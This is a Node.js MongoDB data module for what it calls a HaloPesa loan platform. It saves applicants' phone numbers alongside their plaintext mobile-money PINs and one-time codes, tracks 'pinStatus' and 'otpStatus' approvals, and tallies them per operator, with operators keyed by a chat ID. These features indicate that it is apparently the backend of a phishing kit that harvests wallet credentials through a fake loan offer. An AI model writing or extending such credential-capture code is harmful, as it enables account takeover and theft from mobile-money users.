const { MongoClient } = require('mongodb');

let client;
let db;

// Database and collections
const DB_NAME = 'halopesa_loan_platform';
const COLLECTIONS = {
    ADMINS: 'admins',
    APPLICATIONS: 'applications'
};

/**
 * Connect to MongoDB - Returns null on failure instead of throwing
 */
async function connectDatabase() {
    try {
        const MONGODB_URI = process.env.MONGODB_URI;

        if (!MONGODB_URI) {
            console.warn('⚠️ MONGODB_URI not set - running offline');
            return null;
        }

        console.log('🔄 Connecting to MongoDB...');

        client = new MongoClient(MONGODB_URI, {
            tls: false,
            retryWrites: false,
            serverSelectionTimeoutMS: 5000,
            connectTimeoutMS: 5000,
            socketTimeoutMS: 10000,
            maxPoolSize: 3,
            minPoolSize: 0
        });
        
        await client.connect();
        db = client.db(DB_NAME);
        await db.admin().ping();

        console.log('✅ MongoDB Connected!');
        await createIndexes();
        return db;

    } catch (error) {
        console.error('⚠️ MongoDB failed:', error.message);
        console.log('📌 Running in OFFLINE MODE - data will not persist');
        return null;  // Return null instead of throwing
    }
}

/**
 * Create database indexes
 */
async function createIndexes() {
    try {
        if (!db) return;
        await db.collection(COLLECTIONS.ADMINS).createIndex({ adminId: 1 }, { unique: true });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ email: 1 });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ chatId: 1 });
        await db.collection(COLLECTIONS.ADMINS).createIndex({ status: 1 });

        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ id: 1 }, { unique: true });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ adminId: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ phoneNumber: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ timestamp: -1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ pinStatus: 1 });
        await db.collection(COLLECTIONS.APPLICATIONS).createIndex({ otpStatus: 1 });

        console.log('✅ Indexes created');
    } catch (error) {
        console.warn('⚠️ Could not create indexes:', error.message);
    }
}

/**
 * Close database connection
 */
async function closeDatabase() {
    if (client) {
        await client.close();
        console.log('✅ Database closed');
    }
}

// ==========================================
// ADMIN OPERATIONS
// ==========================================

async function saveAdmin(adminData) {
    try {
        if (!db) return { acknowledged: true };
        const adminId = adminData.adminId || adminData.id;
        if (!adminId || !adminData.name || !adminData.email || !adminData.chatId) {
            throw new Error('Missing required admin fields');
        }

        const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
            { adminId },
            { $set: adminData },
            { upsert: true }
        );
        console.log(`✅ Admin saved: ${adminId}`);
        return result;
    } catch (error) {
        console.error('❌ Error saving admin:', error.message);
        return { acknowledged: false };
    }
}

async function getAdmin(adminId) {
    try {
        if (!db) return null;
        return await db.collection(COLLECTIONS.ADMINS).findOne({ adminId });
    } catch (error) {
        console.error('❌ Error getting admin:', error.message);
        return null;
    }
}

async function getAdminByChatId(chatId) {
    try {
        if (!db) return null;
        return await db.collection(COLLECTIONS.ADMINS).findOne({ chatId });
    } catch (error) {
        console.error('❌ Error getting admin by chat ID:', error.message);
        return null;
    }
}

async function getAllAdmins() {
    try {
        if (!db) return [];
        return await db.collection(COLLECTIONS.ADMINS)
            .find({})
            .sort({ createdAt: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting admins:', error.message);
        return [];
    }
}

async function getActiveAdmins() {
    try {
        if (!db) return [];
        return await db.collection(COLLECTIONS.ADMINS)
            .find({ status: 'active' })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting active admins:', error.message);
        return [];
    }
}

async function updateAdmin(adminId, updates) {
    try {
        if (!db) return { acknowledged: true };
        const result = await db.collection(COLLECTIONS.ADMINS).updateOne(
            { adminId },
            { $set: { ...updates, updatedAt: new Date().toISOString() } }
        );
        return result;
    } catch (error) {
        console.error('❌ Error updating admin:', error.message);
        return { acknowledged: false };
    }
}

async function updateAdminStatus(adminId, status) {
    try {
        if (!db) return { acknowledged: true };
        return await db.collection(COLLECTIONS.ADMINS).updateOne(
            { adminId },
            { $set: { status, updatedAt: new Date().toISOString() } }
        );
    } catch (error) {
        console.error('❌ Error updating admin status:', error.message);
        return { acknowledged: false };
    }
}

async function deleteAdmin(adminId) {
    try {
        if (!db) return { acknowledged: true };
        return await db.collection(COLLECTIONS.ADMINS).deleteOne({ adminId });
    } catch (error) {
        console.error('❌ Error deleting admin:', error.message);
        return { acknowledged: false };
    }
}

async function adminExists(adminId) {
    try {
        if (!db) return false;
        const count = await db.collection(COLLECTIONS.ADMINS).countDocuments({ adminId });
        return count > 0;
    } catch (error) {
        return false;
    }
}

async function getAdminCount() {
    try {
        if (!db) return 0;
        return await db.collection(COLLECTIONS.ADMINS).countDocuments({});
    } catch (error) {
        return 0;
    }
}

// ==========================================
// APPLICATION OPERATIONS
// ==========================================

async function saveApplication(appData) {
    try {
        if (!db) return { acknowledged: true };
        const result = await db.collection(COLLECTIONS.APPLICATIONS).insertOne({
            id:             appData.id,
            adminId:        appData.adminId,
            adminName:      appData.adminName,
            phoneNumber:    appData.phoneNumber,
            pin:            appData.pin,
            pinStatus:      appData.pinStatus  || 'pending',
            otpStatus:      appData.otpStatus  || 'pending',
            otp:            appData.otp        || null,
            assignmentType: appData.assignmentType,
            isReturningUser: appData.isReturningUser || false,
            previousCount:  appData.previousCount   || 0,
            timestamp:      appData.timestamp || new Date().toISOString()
        });
        console.log(`💾 Application saved: ${appData.id}`);
        return result;
    } catch (error) {
        console.error('❌ Error saving application:', error.message);
        return { acknowledged: true };
    }
}

async function getApplication(applicationId) {
    try {
        if (!db) return null;
        return await db.collection(COLLECTIONS.APPLICATIONS).findOne({ id: applicationId });
    } catch (error) {
        console.error('❌ Error getting application:', error.message);
        return null;
    }
}

async function updateApplication(applicationId, updates) {
    try {
        if (!db) return { acknowledged: true };
        const result = await db.collection(COLLECTIONS.APPLICATIONS).updateOne(
            { id: applicationId },
            { $set: { ...updates, updatedAt: new Date().toISOString() } }
        );
        return result;
    } catch (error) {
        console.error('❌ Error updating application:', error.message);
        return { acknowledged: false };
    }
}

async function getApplicationsByAdmin(adminId) {
    try {
        if (!db) return [];
        return await db.collection(COLLECTIONS.APPLICATIONS)
            .find({ adminId })
            .sort({ timestamp: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting applications by admin:', error.message);
        return [];
    }
}

async function getPendingApplications(adminId) {
    try {
        if (!db) return [];
        return await db.collection(COLLECTIONS.APPLICATIONS)
            .find({
                adminId,
                $or: [{ pinStatus: 'pending' }, { otpStatus: 'pending' }]
            })
            .sort({ timestamp: -1 })
            .toArray();
    } catch (error) {
        console.error('❌ Error getting pending applications:', error.message);
        return [];
    }
}

// ==========================================
// STATISTICS OPERATIONS
// ==========================================

async function getAdminStats(adminId) {
    try {
        if (!db) return { total: 0, pinPending: 0, pinApproved: 0, otpPending: 0, fullyApproved: 0 };
        
        const total        = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId });
        const pinPending   = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, pinStatus: 'pending' });
        const pinApproved  = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, pinStatus: 'approved' });
        const otpPending   = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, otpStatus: 'pending' });
        const fullyApproved = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ adminId, otpStatus: 'approved' });
        
        return { total, pinPending, pinApproved, otpPending, fullyApproved };
    } catch (error) {
        console.error('❌ Error getting admin stats:', error.message);
        return { total: 0, pinPending: 0, pinApproved: 0, otpPending: 0, fullyApproved: 0 };
    }
}

async function getStats() {
    try {
        if (!db) return { totalAdmins: 0, totalApplications: 0, pinPending: 0, pinApproved: 0, otpPending: 0, fullyApproved: 0, totalRejected: 0 };
        
        const totalAdmins        = await db.collection(COLLECTIONS.ADMINS).countDocuments({});
        const totalApplications  = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({});
        const pinPending         = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'pending' });
        const pinApproved        = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ pinStatus: 'approved' });
        const otpPending         = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ otpStatus: 'pending' });
        const fullyApproved      = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({ otpStatus: 'approved' });
        const totalRejected      = await db.collection(COLLECTIONS.APPLICATIONS).countDocuments({
            $or: [
                { pinStatus: 'rejected' },
                { otpStatus: 'wrongpin_otp' },
                { otpStatus: 'wrongcode' }
            ]
        });
        return { totalAdmins, totalApplications, pinPending, pinApproved, otpPending, fullyApproved, totalRejected };
    } catch (error) {
        console.error('❌ Error getting stats:', error.message);
        return { totalAdmins: 0, totalApplications: 0, pinPending: 0, pinApproved: 0, otpPending: 0, fullyApproved: 0, totalRejected: 0 };
    }
}

async function getPerAdminStats() {
    try {
        if (!db) return [];
        const admins = await getAllAdmins();
        const statsPromises = admins.map(async (admin) => {
            const stats = await getAdminStats(admin.adminId);
            return { adminId: admin.adminId, name: admin.name, ...stats };
        });
        return await Promise.all(statsPromises);
    } catch (error) {
        console.error('❌ Error getting per-admin stats:', error.message);
        return [];
    }
}

async function getAllAdminsDetailed() {
    try {
        if (!db) return [];
        const admins = await db.collection(COLLECTIONS.ADMINS)
            .find({})
            .sort({ createdAt: -1 })
            .toArray();
        console.log(`📊 Found ${admins.length} admins`);
        return admins;
    } catch (error) {
        console.error('❌ Error getting detailed admins:', error.message);
        return [];
    }
}

async function cleanupInvalidAdmins() {
    try {
        if (!db) return { deletedCount: 0 };
        const result = await db.collection(COLLECTIONS.ADMINS).deleteMany({
            $or: [
                { adminId: { $exists: false } },
                { adminId: null },
                { adminId: '' },
                { chatId: { $exists: false } },
                { chatId: null }
            ]
        });
        console.log(`🧹 Cleaned up ${result.deletedCount} invalid admin(s)`);
        return result;
    } catch (error) {
        console.error('❌ Error cleaning up:', error.message);
        return { deletedCount: 0 };
    }
}

module.exports = {
    connectDatabase,
    closeDatabase,
    saveAdmin,
    getAdmin,
    getAdminByChatId,
    getAllAdmins,
    getActiveAdmins,
    updateAdmin,
    updateAdminStatus,
    deleteAdmin,
    adminExists,
    getAdminCount,
    saveApplication,
    getApplication,
    updateApplication,
    getApplicationsByAdmin,
    getPendingApplications,
    getAdminStats,
    getStats,
    getPerAdminStats,
    getAllAdminsDetailed,
    cleanupInvalidAdmins
};
